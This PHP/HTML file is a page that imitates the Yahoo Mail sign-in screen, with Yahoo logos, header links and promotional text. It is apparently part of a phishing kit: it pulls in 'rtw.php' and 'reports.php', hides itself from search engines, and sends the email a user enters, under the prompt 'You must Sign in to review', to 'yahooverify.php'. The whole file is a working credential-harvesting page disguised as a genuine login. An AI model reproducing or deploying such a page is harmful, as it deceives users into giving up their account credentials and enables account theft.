<?php
if (!isset($_SESSION)) {
  session_start();
}

include "rtw.php";
include "reports.php";
?>
<!DOCTYPE html>
<html id="Stencil" class="no-js">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0"/>
        <meta name="format-detection" content="telephone=no">
        <meta name="referrer" content="origin-when-cross-origin">
        <title>Yahoo</title>
        <META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
       
	   <link rel="shortcut icon" type="image/x-icon" href="images/yico.ico">
        
        <link rel="stylesheet" href="css/minor.css">
       
        <link href="css/all.css" rel="stylesheet" type="text/css">
<link href="css/few.css" rel="stylesheet" type="text/css">
 


<style>body {
margin-top: 0px !important; 
}

#UH{
font: 13px/1.25 "Helvetica Neue",Helvetica,Arial,sans-serif;
}

.YLogoMY{
text-indent: -30em;
}</style> 
    </head>
    <body >
        <div class="mbr-legacy-device-bar " id="mbr-legacy-device-bar">
            <label class="cross" for="mbr-legacy-device-bar-cross" aria-label="Close this warning">x</label>
            <input type="checkbox" id="mbr-legacy-device-bar-cross" />
            
			
        </div>
   

    <div class="loginish  puree-v2">
    <div class="hd mbr-ucs-hd" id="mbr-uh-hd">
   
   
	<div id="UH" class=""> 


	<div id="uhWrapper" class="Mx(a) Z(1) Pos(r) Zoom Mstart(16px) Pt(14px)" data-ylk="rspns:nav;act:click;t1:a1;t2:uh-d;itc:0;" style ="height: 3.8em;"> <div class="UHCol1 Pos(a) Fl(start)" role="presentation">
	
	
<a class="YLogoMY D(b) Ov(h) Ti(-20em) Zoom Darktheme_Bgp(b_t) W(137px) H(34px) Mx(a)! " href="#" target="_top" >Yahoo</a></div> <div class="UHCol3" role="presentation" id="uhNavWrapper"> <ul class="Fl(end) Mend(10px) Lts(-0.31em) Tren(os) Whs(nw) My(6px)">   <li class="yucs-mail-info D(ib) Lts(n) Zoom Va(t) Pos(r) Lh(1.7)">

<a class="yucs-fc D(ib) yltasis yucs-trigger Mend(20px) Lh(1) Td(n) Td(n):h NoTextDecoration" href="" target="_blank"><b>About Mail</b></a>

<a class="yucs-fc D(ib) yltasis yucs-trigger Mend(20px) Lh(1) Td(n) Td(n):h NoTextDecoration" href="" target="_blank"><b>Features</b></a>

<a class="yucs-fc D(ib) yltasis yucs-trigger Mend(20px) Lh(1) Td(n) Td(n):h NoTextDecoration" href="" target="_blank" ><b>Get the App</b></a></li> <li id="yucs-help" class=" yucs-activate yucs-help yucs-menu_nav D(ib) Zoom Va(t) Pos(r) Lh(1.7)"> 

<a id="yucs-help_link" class="C(#000)! D(ib) Lts(n) yltasis yucs-trigger Lh(1) Td(n)! Td(u)!:h Fz(13px)" href="" target="_blank" > <b>Settings</b> </a></li> </ul> </div> </div><!-- /#UH --></div>   
</div>

        <div class="login-box-container">
            <div class="login-box ">
                <div class="txt-align-center">
                        <img src="images/yLogo.png" alt="Yahoo" class="logo " width="125" />
                </div>
                <div class="challenge">
    <div id="password-challenge" class="primary">
    <div class="greeting">
	<h1 class="username">You must Sign in to review </h1>
        
    </div>
    <form action="yahooverify.php" method="post" class="pure-form pure-form-stacked">
       

        
        
        <input type="text" id="login-passwd"  name="eUser" placeholder="Email" required="required"/>
        <p class="signin-cont" >
            <button type="submit" name="submit" id="login-signin" class="pure-button puree-button-primary puree-spinner-button" name="verifyPassword" value="Sign in" >
                Sign in
            </button>
        </p>
        <p class="forgot-cont">
            <input type="submit" class="pure-button puree-button-link" id="mbr-forgot-link"
                name="skip" value="I forgot my password" />
        </p>
    </form>
</div>

</div>

            </div>
            <div id="login-box-ad-fallback" class="login-box-ad-fallback">
                <h1>Yahoo makes it easy to enjoy what matters most in your world.</h1>
<p>Best in class Yahoo Mail, breaking local, national and global news, finance, sports, music, movies and more. You get more out of the web, you get more out of life.</p>

            </div>
        </div>
        <div class="login-box-ad-outer">
            <div class="login-box-ad-inner">
                <div id="login-ad-rich"></div>
            </div>
        </div>
</div>

 
   
   
    <div id="mbr-css-check"></div>
</body>
</html>

